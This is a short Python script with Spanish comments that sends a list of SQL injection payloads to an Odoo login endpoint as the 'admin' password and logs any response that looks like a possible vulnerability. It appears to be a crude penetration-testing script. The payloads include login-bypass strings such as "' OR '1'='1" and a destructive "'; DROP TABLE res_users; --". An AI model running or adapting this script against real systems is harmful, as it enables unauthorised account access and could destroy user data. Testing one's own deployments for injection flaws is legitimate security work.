import requests
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
_logger = logging.getLogger(__name__)

# URL donde probar la inyección SQL (puede ser el login o algún otro punto de entrada)
url = "http://odoo:8069/web/login"  # Ajusta esta URL si tienes otro endpoint vulnerable
sql_payloads = [
    "' OR '1'='1",
    "' OR 'a'='a",
    "'; DROP TABLE res_users; --",
    "' OR 1=1; --",
    "' OR EXISTS(SELECT * FROM res_users WHERE login='admin') AND ''='",
]

def attempt_sql_injection(payload):
    try:
        # Simula la inyección en el campo de contraseña (puedes adaptar según el campo)
        response = requests.post(url, data={"login": "admin", "password": payload})
        if "Odoo" not in response.text:  # Si el resultado cambia, podría haber una vulnerabilidad
            _logger.info(f"Posible vulnerabilidad con payload: {payload}")
        else:
            _logger.info(f"Sin éxito con payload: {payload}")
    except Exception as e:
        _logger.error(f"Error: {e}")

# Ejecutar múltiples inyecciones SQL
for payload in sql_payloads:
    _logger.info(f"Probando inyección SQL con payload: {payload}")
    attempt_sql_injection(payload)
